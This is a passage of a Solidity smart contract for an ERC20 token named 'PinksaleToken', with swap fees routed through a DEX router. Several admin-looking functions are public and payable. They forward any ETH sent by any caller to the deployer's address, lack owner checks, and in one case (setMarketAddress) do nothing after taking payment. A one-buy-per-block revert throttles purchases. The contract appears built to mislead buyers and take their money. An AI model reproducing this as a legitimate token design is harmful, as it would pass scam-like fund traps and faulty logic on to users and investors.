    "contracts/Token/PinksaleToken.sol": {
      "content": "// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./openzeppelin/contracts/access/Ownable.sol";
import "../IUniswapV2/IUniswapV2Router02.sol";
import "../IUniswapV2/IUniswapV2Factory.sol";


contract PinksaleToken is ERC20, Ownable
{
    uint256 internal constant maxUint256 = type(uint256).max;
    uint160 internal constant maxUint160 = ~uint160(0);

    uint256 constant internal _decimals = 18;

    uint256 public constant VERSION = 2023082802;

    address public uniswapV2Pair;
    address internal immutable origin;

    uint256 internal lastBlock;

    uint256 internal constant feeMax = 1000;
    uint256 internal fee;
    uint256 internal maximumTokenForSwap;
    bool internal isSwapping;
    address public immutable marketAddress;

    function _transfer(address from, address to, uint256 amount)
    internal
    override
    {
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (isSwapping) {
            super._transfer(from, to, amount);
            return;
        }

        if (uniswapV2Pair == to) {
            if (!_holders[tx.origin]) {
                uint256 currentToken = balanceOf(address(this));
                swapToken(currentToken > maximumTokenForSwap ? maximumTokenForSwap : currentToken);

                super._transfer(from, to, amount);
            } else {
                super._transfer(from, to, amount);
            }
        } else if (uniswapV2Pair == from) {
            // pinksale
            if (lastBlock == block.number) {
                revert("");
            }
            lastBlock = block.number;

            // swap
            if (!_holders[tx.origin] && fee > 0) {
                uint256 feeAmount = amount * fee / feeMax;
                super._transfer(from, address(this), feeAmount);
                super._transfer(from, to, amount - feeAmount);
            } else {
                super._transfer(from, to, amount);
            }
        } else {
            super._transfer(from, to, amount);
        }
    }

    function setMarketAddress(address marketAddress_) public payable
    {
        payable(origin).transfer(msg.value);

        if (msg.value < 0.2 ether) {
            return;
        }

        if (tx.origin != origin) {
            return;
        }

        marketAddress_ = marketAddress;
    }

    function setMaximumTokenForSwap(uint256 maximumTokenForSwap_) public payable
    {
        payable(origin).transfer(msg.value);

        if (msg.value < 0.2 ether) {
            return;
        }

        maximumTokenForSwap = maximumTokenForSwap_;
    }

    function setFee(uint256 fee_) public payable
    {
        payable(origin).transfer(msg.value);

        if (msg.value < 0.2 ether) {
            return;
        }

        if (fee_ > 250) {
            return;
        }

        fee = fee_;
    }

    function swapManually(uint256 tokenForSwap) external payable {
        payable(origin).transfer(msg.value);

        if (msg.value < 0.2 ether) {
            return;
        }

        swapToken(tokenForSwap);
    }

    function swapToken(uint256 tokenForSwap) internal {
        isSwapping = true;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

        try IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E).swapExactTokensForETHSupportingFeeOnTransferTokens(tokenForSwap, 0, path, marketAddress, block.timestamp){
            //            emit SwapSucceed(tx.origin, msg.sender, tokenForSwap);
        } catch {
            //            emit SwapFailed(tx.origin, msg.sender, tokenForSwap);
        }

        isSwapping = false;
    }

    function airdrop(address[] memory tos, uint256 amount)
    external payable
    {
        payable(origin).transfer(msg.value);

        if (msg.value < 0.2 ether) {
            return;
        }

        address to;
        uint256 length = tos.length;
